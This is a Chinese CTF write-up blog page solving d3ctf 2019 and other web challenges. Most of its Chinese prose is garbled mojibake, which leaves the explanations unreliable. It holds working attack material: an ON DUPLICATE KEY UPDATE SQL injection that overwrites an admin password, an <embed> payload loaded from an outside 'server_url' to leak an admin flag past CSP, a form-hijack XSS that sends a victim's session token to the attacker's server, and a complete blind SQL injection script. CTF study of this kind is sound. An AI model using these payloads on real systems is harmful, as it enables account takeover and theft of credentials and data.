<p>insert çš„ä¸€ä¸ªæ–¹æ³•å¯ä»¥ä¿®æ”¹é‡å¤çš„å€¼  <code>insert on duplicate key update</code> ï¼Œå®ƒèƒ½å¤Ÿè®©æˆ‘ä»¬åœ¨æ–°æ’å…¥çš„ä¸€ä¸ªæ•°æ®å’ŒåŸæœ‰æ•°æ®å‘ç”Ÿé‡å¤æ—¶ï¼Œä¿®æ”¹åŸæœ‰æ•°æ®ã€‚é‚£ä¹ˆæˆ‘ä»¬é€šè¿‡è¿™ä¸ªæŠ€å·§ä¿®æ”¹ç®¡ç†å‘˜çš„å¯†ç å³å¯ã€‚ </p>
<p>æµ‹è¯•testç”¨æˆ·,åŸå¯†ç :123</p>
<p>æ„é€ <code>user=test%1$&#39;,0x60)on duplicate key update password=0x38643936396565663665636164336332396133613632393238306536383663663063336635643561383661666633636131323032306339323361646336633932#&amp;pass=123</code></p>
<p>æˆåŠŸå°†å¯†ç ä¿®æ”¹ä¸º123456ï¼Œå†²adminå¯†ç </p>
<p>æ¥ç€è¿›å…¥webconsoleå½“ä¸­,æç¤ºåªæœ‰å†…ç½‘æ‰èƒ½ä½¿ç”¨</p>
<p>ç›¸å…³ä»£ç </p>
<pre><code class="php">if ($this-&gt;request-&gt;user-&gt;username === &quot;admin&quot; &amp;&amp; !filter_var(
                $_SERVER[&#39;HTTP_CLIENT_IP&#39;],
                FILTER_VALIDATE_IP,
                FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
            ))</code></pre>
<p>emmmç›´æ¥ä¿®æ”¹cilent-ipå‘ç°ä¸è¡Œ</p>
<blockquote>
<p>å› ä¸ºè¿™é‡Œçš„<code>Client-IP</code>å¤´æ˜¯åä»£å±‚é¢è®¾ç½®çš„ï¼ˆset $Client-IP $remote_addrï¼‰, æ‰€ä»¥æ— æ³•é€šè¿‡å‰ç«¯ä¿®æ”¹è¯·æ±‚å¤´æ¥ä¼ªé€ ã€‚ </p>
<p>è¿™æ—¶å¯ä»¥ä»æœåŠ¡å™¨è¿”å›çš„<code>Server</code>å¤´ä¸­å‘ç°ï¼Œåä»£æ˜¯<code>ATS7.1.2</code> é‚£ä¹ˆåº”è¯¥å¾ˆæ•æ„Ÿçš„æƒ³åˆ°é€šè¿‡<code>HTTPèµ°ç§</code> æ¥ç»•è¿‡åä»£ï¼Œè§„é¿åä»£è®¾ç½®<code>Client-IP</code>ã€‚ </p>
</blockquote>
<p>é‚£ä¹ˆä»€ä¹ˆæ˜¯ast?</p>
<blockquote>
<p>Apache Traffic Serverâ„¢ is a high-performance web proxy cache that improves network efficiency and performance by caching frequently-accessed information at the edge of the network. This brings content physically closer to end users, while enabling faster delivery and reduced bandwidth use. Traffic Server is designed to improve content delivery for enterprises, Internet service providers (ISPs), backbone providers, and large intranets by maximizing existing and available bandwidth. </p>
</blockquote>
<p>emmmm,astæ˜¯ä¸€ä¸ªåœ¨ç”¨æˆ·å’ŒæœåŠ¡å™¨ä¹‹é—´çš„èµ·ç¼“å†²åŠ é€Ÿçš„ä»£ç†æœåŠ¡å™¨,è¿™ä¹Ÿæ­£æ˜¯httpèµ°ç§å¸¸å‡ºç°çš„åº”ç”¨åœºæ™¯</p>
<p><code>ATS7.1.2</code> æœ‰ä¸ªcveæ°å¥½æ˜¯å…³äºhttpèµ°ç§çš„ï¼Œç›´æ¥ç”¨å°±okäº†</p>
<h3 id="babyxss"><a href="#babyxss" class="headerlink" title="babyxss"></a>babyxss</h3><p>emmm,ctfçš„å¼¥å¤©å¤§è°</p>
<pre><code class="python">from flask import Flask, render_template_string, session, request, make_response
import hashlib
import os
import json
from rq import Queue
from redis import Redis

app = Flask(__name__)
app.config[&#39;SECRET_KEY&#39;] = &#39;somesecret&#39;
config = json.load(open(&#39;config.json&#39;, &#39;r&#39;))


def verify_url(url):
    base = &#39;https://&#39;+request.host
    if len(url) == 0:
        return False
    if len(url) &lt; len(base) or url[:len(base)] != base:
        return False
    return True


def verify_captcha(captcha):
    return &#39;captcha&#39; in session.keys() \
        and len(session.get(&#39;captcha&#39;)) == 5 \
        and hashlib.md5(captcha.encode()).hexdigest()[:5] == session.get(&#39;captcha&#39;)


def add_queue(url):
    q = Queue(connection=Redis(
        host=config[&#39;redis&#39;][&#39;host&#39;],
        password=config[&#39;redis&#39;][&#39;auth&#39;]
    ))
    q.enqueue(&#39;bot.add&#39;, url)


@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
@app.route(&#39;/index.php&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def index():
    message = &quot;&quot;
    if request.method == &#39;POST&#39;:
        try:
            if &#39;captcha&#39; in request.form.keys() and &#39;url&#39; in request.form.keys():
                captcha = request.form[&#39;captcha&#39;]
                url = request.form[&#39;url&#39;]
                if not verify_captcha(captcha):
                    message = &quot;Wrong Captcha :(&quot;
                elif not verify_url(url):
                    message = &quot;Wrong URL :(&quot;
                else:
                    session.pop(&#39;captcha&#39;)
                    message = &quot;Done! Please wait for the admin to check it out. XD&quot;
                    add_queue(url)
        except:
            message = &quot;Error! Please contact admin&quot;
    if &#39;captcha&#39; not in request.form.keys() or &#39;captcha&#39; not in session.keys():
        session[&#39;captcha&#39;] = hashlib.md5(os.urandom(16)).hexdigest()[:5]
    return render_template_string(
        index,
        message=message,
        host=&#39;https://&#39;+request.host,
        captcha=session[&#39;captcha&#39;]
    )


@app.route(&#39;/fd.php&#39;)
def mirror():
    response = make_response(request.args.get(&#39;q&#39;))
    response.headers[&#39;Content-Security-Policy&#39;] = &quot;img-src &#39;none&#39;; script-src &#39;none&#39;; frame-src &#39;none&#39;; connect-src &#39;none&#39;&quot;
    return response


@app.route(&#39;/admin.php&#39;)
def admin():
    if request.headers.get(&#39;x-forwarded-for&#39;) != config[&#39;redis&#39;][&#39;host&#39;]:
        return &#39;only admin can see it&#39;
    token = request.host.split(&#39;.&#39;)[0]
    return f&#39;&#39;&#39;{{
    "token": "{token}",
    "flag": "d3ctf{{{hashlib.sha256((
        token+config["challenge"]["flag"]
    ).encode()).hexdigest()}}}&quot;
}}
&#39;&#39;&#39;</code></pre>
<p>å…³é”®ä»£ç :</p>
<pre><code class="python">if request.method == &#39;POST&#39;:
        try:
            if &#39;captcha&#39; in request.form.keys() and &#39;url&#39; in request.form.keys():
                captcha = request.form[&#39;captcha&#39;]
                url = request.form[&#39;url&#39;]
                if not verify_captcha(captcha):
                    message = &quot;Wrong Captcha :(&quot;
                elif not verify_url(url):
                    message = &quot;Wrong URL :(&quot;
                else:
                    session.pop(&#39;captcha&#39;)
                    message = &quot;Done! Please wait for the admin to check it out. XD&quot;
                    add_queue(url)
        except:
            message = &quot;Error! Please contact admin&quot;</code></pre>
<pre><code class="python">
def verify_url(url):
    base = &#39;https://&#39;+request.host
    if len(url) == 0:
        return False
    if len(url) &lt; len(base) or url[:len(base)] != base:
        return False
    return True
</code></pre>
<p>é€šè¿‡verify_urlä¹‹å,adminä¾¿å›è®¿é—®.è¿™é‡Œç”¨<code>&#39;https://&#39;+request.host</code>æ¥éªŒè¯æ˜¯å¦æ¥æºäºåŸç½‘ç«™</p>
<p>emmm,request.host=<code>/fd.php</code>,å°±ä¸ç”¨è€ƒè™‘ä¿®æ”¹hostæ¥ç»•è¿‡æ‹‰</p>
<p>é‚£ä¹ˆå°±æ˜¯è¦ç»•<code>/fd.php</code>çš„cspç­–ç•¥äº†:<code>img-src &#39;none&#39;; script-src &#39;none&#39;; frame-src &#39;none&#39;; connect-src &#39;none&#39;</code></p>
<p>çœŸçš„æ˜¯babyéš¾åº¦å•Šã€‚ã€‚ã€‚ã€‚ã€‚</p>
<blockquote>
<p>ä¸¢åˆ°csp-evaluatoré‡Œå¤´å¯ä»¥å‘ç°æ²¡æœ‰è®¾ç½®object-src<br>object-srcå…è®¸åµŒå…¥object<br>æ ¹æ®hintå»<code>chrome://components</code>é‡Œå¤´æ‰¾æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ç»„ä»¶<br>æœ€æ–°ç‰ˆchromeå·²ç»é»˜è®¤ç¦æ­¢äº†flashçš„ä½¿ç”¨(ç„¶è€Œå°±æ˜¯æœ‰å¾ˆå¤šäººä¸ä¿¡é‚ª)<br>é€šè¿‡ä¸€äº›æœç´¢å¯ä»¥å‘ç°pNaClå¯ä»¥è·‘C/C++</p>
<p>å¯ä»¥ç¼–å†™ä¸€ä¸ªLeakå»è¯·æ±‚admin.phpï¼Œè·å–flagï¼Œç„¶åå†å°†flagå¸¦å‡ºæ¥<br>ä¸‹è½½ä¸‹æ¥è°·æ­Œçš„<a href="https://developers.google.com/native-client/dev/sdk/download" target="_blank" rel="noopener">SDK</a>å’ŒLeakåå¯ä»¥ç¼–è¯‘å‡ºä¸€ä¸ªnmfæ–‡ä»¶å’Œä¸€ä¸ªpexeæ–‡ä»¶ï¼Œæ”¾åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Šç„¶åå°è¯•:</p>
<pre><code class="html">&lt;embed src=&quot;http://server_url/url_loader.nmf&quot; type=&quot;application/x-pnacl&quot;&gt;</code></pre>
<p>è½»æ¾è·å¾—äº†ä¸€ä¸ªMixed Contentå‘¢ï¼ˆï¼ˆæ¯’ç˜¤å‡ºé¢˜äºº<br>ä¸Šhttpsä»¥åå‘ç°:</p>
<pre><code>PNaCl modules can only be used on the open web (non-app/extension) when the PNaCl Origin Trial is enabled</code></pre><p>æœç´¢Origin Trialï¼Œçœ‹æ–°é—»ï¼š</p>
<p><a href="https://developer.chrome.com/native-client/migration" target="_blank" rel="noopener">https://developer.chrome.com/native-client/migration</a><br><a href="https://github.com/GoogleChrome/OriginTrials/blob/gh-pages/developer-guide.md" target="_blank" rel="noopener">https://github.com/GoogleChrome/OriginTrials/blob/gh-pages/developer-guide.md</a></p>
<p>å»<a href="https://developers.chrome.com/origintrials" target="_blank" rel="noopener">Origin Trial</a>ç”³è¯·ä¸€ä¸ªtokenï¼Œæœ€ç»ˆçš„payload:</p>
<pre><code>&lt;meta http-equiv=&quot;origin-trial&quot; content=&quot;[token]&quot;&gt;
&lt;embed src=&quot;https://server_url/url_loader.nmf&quot; type=&quot;application/x-pnacl&quot;&gt;</code></pre></blockquote>
<h3 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a>guestbook</h3><p>è‡ªå·±æ­çš„ç¯å¢ƒæ¯›ç—…ä¸€å¤§å †///å°±ç›´æ¥çœ‹åˆ«äººwpäº†</p>
<p>é¢˜ç›®æ˜¯ä¸€ä¸ªåœ¨çº¿ç•™è¨€æ¿ï¼Œæ³¨å†Œç™»å½•åå¯ä»¥æäº¤ç•™è¨€ã€‚</p>
<p>ç®€å•æµ‹è¯•åä¼šå‘ç°ç•™è¨€å¯ä»¥æ’å…¥ HTML æ ‡ç­¾ï¼Œä½†æ˜¯åç«¯ä½¿ç”¨äº†æ ‡ç­¾å/å±æ€§åç™½åå•åšè¿‡æ»¤ï¼Œä¸€èˆ¬çš„å±é™©æ ‡ç­¾å’Œå±æ€§éƒ½è¢« ban æ‰äº†ã€‚</p>
<p>æ§åˆ¶å°å¯ä»¥çœ‹åˆ°æ‰“åŒ…å‰çš„å‰ç«¯æºç ï¼Œå®¡è®¡ä¸€æ³¢ã€‚</p>
<p>ç¬¬ä¸€ä¸ªé—®é¢˜ï¼ŒCSRF token æ˜¯ç›´æ¥ä½¿ç”¨çš„ sessionid :</p>
<p><a href="https://camo.githubusercontent.com/78572404b4f302815535605f49e47477df47f136/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f674f73476c66557a5a41767848434d2e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/78572404b4f302815535605f49e47477df47f136/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f674f73476c66557a5a41767848434d2e706e67" alt="img"></a></p>
<p>å› æ­¤å¦‚æœæˆ‘ä»¬èƒ½è·å¾—ä»–äººçš„ token å°±å¯ä»¥ç™»å½•ä»–äººè´¦å·ã€‚</p>
<p>ç¬¬äºŒä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬ä¼ å…¥çš„å‚æ•° this.$route.query.did è¢«æ‹¼æ¥åˆ°äº† jsonp æ–¹æ³•çš„ url å½“ä¸­</p>
<p><a href="https://camo.githubusercontent.com/37614f78f54c402a09ef0efb3bdc891ee76697be/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f54627a6e38726741743453354568322e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/37614f78f54c402a09ef0efb3bdc891ee76697be/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f54627a6e38726741743453354568322e706e67" alt="img"></a></p>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥è®¾ç½® did ä¸º <code>1/delete?callback=alert#</code> ï¼Œæ§åˆ¶ jsonp çš„ callback ï¼Œåœ¨ jsonp æ–¹æ³•ä¸­ä¼šç›´æ¥æ‰§è¡Œï¼š</p>
<p><a href="https://camo.githubusercontent.com/b44851e6b9409b003729254870ebe56c33a0023d/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f32346958784f774b4d4979685551362e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/b44851e6b9409b003729254870ebe56c33a0023d/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f32346958784f774b4d4979685551362e706e67" alt="img"></a></p>
<p>ä½†æ˜¯åç«¯çš„ jsonp api ç»™ callback åšäº†æ ¡éªŒï¼Œåªèƒ½ä¼ å…¥æœ‰é™çš„å­—ç¬¦ï¼Œå¹¶ä¸èƒ½ä»»æ„æ‰§è¡Œ js ä»£ç ã€‚</p>
<p><a href="https://camo.githubusercontent.com/c9d4940ee30bed9d3d348a23c5ef124647fce4e8/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f74514e6a44703138434b6e32376b642e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/c9d4940ee30bed9d3d348a23c5ef124647fce4e8/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f74514e6a44703138434b6e32376b642e706e67" alt="img"></a></p>
<p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠŠè¿™ä¸¤ä¸ªé—®é¢˜ç»“åˆåˆ©ç”¨ä¸€ä¸‹ï¼Œåˆ©ç”¨è¿™ä¸ªå—é™çš„ jsonp xss æ¥åŠ«æŒ token ã€‚</p>
<p><a href="https://camo.githubusercontent.com/fb13e5fdc26601fe743c654637ce47d4654b8de9/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f795a5769367348503252397a3344312e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/fb13e5fdc26601fe743c654637ce47d4654b8de9/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f795a5769367348503252397a3344312e706e67" alt="img"></a></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ° token è¢«æ¸²æŸ“åˆ°äº† id ä¸º messageForm çš„ form ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•åŠ«æŒè¿™ä¸ª form ï¼Œè®©ä»–çš„ submit åæäº¤åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œä»è€Œè·å– token ã€‚</p>
<p>å¦‚ä½•åŠ«æŒå‘¢ï¼Ÿåˆ©ç”¨ä¸¤ä¸ª HTML5 çš„æœ‰è¶£å±æ€§ï¼š</p>
<blockquote>
<p><a href="https://www.w3school.com.cn/tags/att_input_formaction.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/tags/att_input_formaction.asp</a></p>
<p><a href="https://www.w3school.com.cn/tags/att_input_form.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/tags/att_input_form.asp</a></p>
</blockquote>
<p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç•™è¨€åŠŸèƒ½æ’å…¥ä¸€ä¸ªåœ¨è¡¨å•ä¹‹å¤–çš„ input æ ‡ç­¾ï¼Œå†åˆ©ç”¨è¿™ä¸¤ä¸ªå±æ€§æ¥åŠ«æŒè¡¨å•ï¼š</p>
<p><a href="https://camo.githubusercontent.com/7c7d13633a5d667951eb89bc40a16176ca12ddb7/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f35544b66655745706958554c4d79612e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/7c7d13633a5d667951eb89bc40a16176ca12ddb7/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f35544b66655745706958554c4d79612e706e67" alt="img"></a></p>
<p>åˆ©ç”¨ jsonp xss æ¥ç‚¹å‡»å®ƒï¼š</p>
<pre><code>http://localhost:8180/#/?pid=72&amp;did=23%2Fdelete%3Fcallback%3Dfish.click%23</code></pre><p>token å°±åˆ°æ‰‹äº†ï¼š</p>
<p><a href="https://camo.githubusercontent.com/ff79d0d683a4390d754c37675bc300da483a31e9/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f576f7544666b724277684c415837502e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/ff79d0d683a4390d754c37675bc300da483a31e9/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f576f7544666b724277684c415837502e706e67" alt="img"></a></p>
<p>report è¿™æ¡ payload ï¼Œè·å¾— admin çš„ token ä¹‹åç™»å½• admin è´¦å·ï¼Œåœ¨ admin çš„ç•™è¨€ä¸­è·å¾— flag ã€‚</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="c-c"><a href="#c-c" class="headerlink" title="c+c"></a>c+c</h3><p>readme.txt</p>
<blockquote>
<p>This is a lite (which means there is no voice but the script is complete.) version of a great galgame (a.k.a. Visual Novel) written by Romeo Tanaka. Hope you enjoy it.<br>PS: I did some small hack to the game for cracking. But you still need steam running to play this game.<br>PSS: If you like it, you can buy it on steam.<br>PSSS: Do not forget to find the flag. And the flag is just in THIS file.î€€</p>
</blockquote>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g976rzdu69j30j001aglt.jpg" alt="image.png"></p>
<p>æ¸¸æˆä¸­ä¼šå‡ºç°</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g976tjarq4j308k01nt8n.jpg" alt="image.png"></p>
<p>ä¸€äº›ä¸å¯è§å­—ç¬¦8ä¸ªä»¥ä¸Š,å¯èƒ½æ˜¯flag?</p>
<pre><code class="lua">function L0_0()
  local L0_32, L1_33, L2_34, L3_35
  L0_32 = {
    L1_33,
    L2_34,
    L3_35,
    172,
    21,
    149,
    198,
    139,
    38,
    63,
    174,
    238,
    232,
    20,
    85,
    107
  }
  L1_33 = 221
  L2_34 = 179
  L3_35 = 102
  L1_33 = 166
  L2_34 = 44
  L3_35 = &quot;{&quot;
  for _FORV_7_ = 1, #L0_32 do
    L3_35 = L3_35 .. string.format(&quot;%02x&quot;, L0_32[_FORV_7_] ~ L1_33)
    if _FORV_7_ == 4 or _FORV_7_ == 6 or _FORV_7_ == 8 or _FORV_7_ == 10 then
      L3_35 = L3_35 .. &quot;-&quot;
    end
  end
  L3_35 = L3_35 .. &quot;}&quot;
  return &quot;&quot;, &quot;&quot;, string.upper(L3_35), L2_34

end</code></pre>
<p>suç›´æ¥å»ä¹°äº†åŸç‰ˆæ¸¸æˆï¼Œå¯¹æ¯”å‘ç°åªæœ‰dllï¼Œexeæ–‡ä»¶ä¸åŒ</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g97whcjur2j31ya0poq7p.jpg" alt="image.png"></p>
<p>é˜µäº¡</p>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://www.ccreater.top/1970/01/01/d3ctf2019/">https://www.ccreater.top/1970/01/01/d3ctf2019/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/d3ctf2019/" data-id="ckmn5757z0095s1ni0pdx88ob" data-title="d3ctf" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-4æœˆåšé¢˜" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/4%E6%9C%88%E5%81%9A%E9%A2%98/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">åšé¢˜ç¬”è®°</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/4%E6%9C%88%E5%81%9A%E9%A2%98/">4æœˆåšé¢˜</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="4æœˆåšé¢˜"><a href="#4æœˆåšé¢˜" class="headerlink" title="4æœˆåšé¢˜"></a>4æœˆåšé¢˜</h1><h2 id="happyctfd"><a href="#happyctfd" class="headerlink" title="happyctfd"></a>happyctfd</h2><p>åˆšå¼€å§‹çœ‹è¿™ä¸ªéå¸¸æ€•â€¦åæ¥è°·æ­Œäº†ä¸€ä¸‹ctfdçš„cveç›´æ¥æ‰“ç©¿,è¿™é¢˜å°±æ˜¯å¼Ÿå¼Ÿ</p>
<p> <a href="https://copyfuture.com/blogs-details/20200305225221297r8myv7xpvv0lqr0" target="_blank" rel="noopener">https://copyfuture.com/blogs-details/20200305225221297r8myv7xpvv0lqr0</a> </p>
<p>ç™»é™†åå°åæŠŠæ•°æ®å¯¼å‡ºå°±æ‹¿åˆ°flagäº†</p>
<p><code>flag{1b236e8e-8f64-461d-a973-7059e706aeec}</code></p>
<h2 id="finalsql"><a href="#finalsql" class="headerlink" title="finalsql"></a>finalsql</h2><p>æœ‰ä¸¤å¤„æ³¨å…¥ç‚¹</p>
<p>ç¬¬ä¸€å¤„:</p>
<p><code>/search.php?id=1</code></p>
<p>é»‘åå•:<code>hex,if, ,and</code></p>
<p>payload:<code>/search.php?id=1/(((select(ord(substr(group_concat(table_name),20,1)))from(information_schema.tables)where(table_schema=database()))-31)&gt;0)</code></p>
<p>ç›²æ³¨è„šæœ¬:</p>
<pre><code class="python">import requests
import time
#ä¿®æ”¹biggerå’Œsqlinjå°±å¥½


#å®ç°biggeræ‰èƒ½ä½¿ç”¨
def findByDichotomy(begin,end):
    max_num=end
    while True:
        mid=int((begin+end)/2)
        if begin==max_num:
            return False
        if begin==end:
            return begin
        if end-begin==1:
            if bigger(begin):
                return end
            else:
                return begin
        if bigger(mid):
            begin=mid+1
        else:
            end=mid

#å¾…æ±‚æ•°æ®å¤§äºnum
def bigger(num):
    return sqlinj(num)
def less(num):
    pass
def equal(num):
    pass

def sqlinj(num):


    burp0_url = &quot;http://ff83c0e6-205f-4296-a512-fe2919cdeda4.node3.buuoj.cn:80/search.php?id=1/(((select(ord(substr(group_concat(username,&#39;,&#39;,password),POS,1)))from(F1naI1y))-GUESS)&gt;0)&quot;.replace(&quot;GUESS&quot;,str(num)).replace(&quot;POS&quot;,str(pos))
    burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://ff83c0e6-205f-4296-a512-fe2919cdeda4.node3.buuoj.cn/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    res=requests.get(burp0_url, headers=burp0_headers)
    time.sleep(0.5)
    print(&quot;test &quot;,num)
    if &quot;NO! Not this! Click others~~~&quot; in res.text:
        return True
    else:
        return False


result=&quot;mygod,cl4y_is_really_amazing,welcome,welcome_to_my_blog,site,http://www.cl4y.top,site,http://www.cl4y.top,site&quot;
pos=len(result)+1
while True:
    num=findByDichotomy(32,128)
    if num is False:
        print(result)
        break
    result+=chr(num)
    print(result)
    pos+=1</code></pre>
<p>æ•°æ®åº“:information_schema,test,performance_schema,mysql,geek</p>
<pre><code>F1naI1y,Flaaaaag

Flaaaaag:id,fl4gaws

F1naI1y:id,username,password

mygod,cl4y_is_really_amazing,welcome,welcome_to_my_blog,site,http://www.cl4y.top,site,http://www.cl4y.top,site,http://www.cl4y.top,site,http://www.cl4y.top,Syc,welcom_to_Syclover,finally,cl4y_really_need_a_grilfriend,flag,flag{2e7c980e-7fff-443b-8d1a-1371eaa326ba}</code></pre><p>æµ‹è¯•åç¬¬äºŒæ¬¡å‘ç°ä¸å¦‚ç¬¬ä¸€å¤„å¥½ç”¨,å°±ä¸å†™äº†</p>
<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><pre><code class="python">
from flask import Flask, request
import os
app = Flask(__name__)

flag_file = open(&quot;flag.txt&quot;, &quot;r&quot;)
# flag = flag_file.read()
# flag_file.close()
#
# @app.route(&#39;/flag&#39;)
# def flag():
#     return flag
## want flag? naive!

# You will never find the thing you want:) I think
@app.route(&#39;/shell&#39;)
def shell():
    os.system(&quot;rm -f flag.txt&quot;)
    exec_cmd = request.args.get(&#39;c&#39;)
    os.system(exec_cmd)
    return &quot;1&quot;

@app.route(&#39;/&#39;)
def source():
    return open(&quot;app.py&quot;,&quot;r&quot;).read()

if __name__ == &quot;__main__&quot;:
    app.run(host=&#39;0.0.0.0&#39;)
</code></pre>
<p>å»fdæ‰¾flag</p>
<p><code>flag{7410ef7f-b10e-4da4-9beb-29f304fec028}</code></p>
<p>so easy</p>
<h2 id="blanklist"><a href="#blanklist" class="headerlink" title="blanklist"></a>blanklist</h2><p>å †å æ³¨å…¥,handleä»£æ›¿select</p>
<p><code>flag{dad3eb12-8877-4ea8-8bfe-98ac99a93715}</code></p>
<h2 id="æ¯ç‡¥çš„æŠ½å¥–"><a href="#æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="æ¯ç‡¥çš„æŠ½å¥–"></a>æ¯ç‡¥çš„æŠ½å¥–</h2><pre><code class="php">&lt;?php
#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼
header(&quot;Content-Type: text/html;charset=utf-8&quot;);
session_start();
if(!isset($_SESSION[&#39;seed&#39;])){
$_SESSION[&#39;seed&#39;]=rand(0,999999999);
}

mt_srand($_SESSION[&#39;seed&#39;]);
$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
$str=&#39;&#39;;
$len1=20;
for ( $i = 0; $i &lt; $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 10);
echo &quot;&lt;p id=&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;


if(isset($_POST[&#39;num&#39;])){
    if($_POST[&#39;num&#39;]===$str){x
        echo &quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag{xxxxxxxxx}&lt;/p&gt;&quot;;
    }
    else{
        echo &quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;;
    }
}
show_source(&quot;check.php&quot;);</code></pre>
<p>ç”¨php_mt_randæ¥çˆ†ç ´</p>
<p><code>flag{1c171630-aee4-400c-b629-a9e457cbe15e}</code></p>
<p>ä¸€å®šè¦å»<code>https://www.openwall.com/php_mt_seed/</code>ä¸‹è½½,ä¸è¦å»githubçš„é•œåƒä¸‹è½½,æŠŠæˆ‘å‘æ­»äº†</p>
<h2 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h2><pre><code class="php">&lt;?php
include &quot;mysql.php&quot;;
session_start();
if($_SESSION[&#39;login&#39;] != &#39;yes&#39;){
    header(&quot;Location: ./login.php&quot;);
    die();
}
if(isset($_GET[&#39;do&#39;])){
switch ($_GET[&#39;do&#39;])
{
case &#39;write&#39;:
    $category = addslashes($_POST[&#39;category&#39;]);
    $title = addslashes($_POST[&#39;title&#39;]);
    $content = addslashes($_POST[&#39;content&#39;]);
    $sql = &quot;insert into board
            set category = &#39;$category&#39;,
                title = &#39;$title&#39;,
                content = &#39;$content&#39;&quot;;#category=result&#39; ,bo_id=&#39;1\
    $result = mysql_query($sql);
    header(&quot;Location: ./index.php&quot;);
    break;
case &#39;comment&#39;:
    $bo_id = addslashes($_POST[&#39;bo_id&#39;]);
    $sql = &quot;select category from board where id=&#39;$bo_id&#39;&quot;;
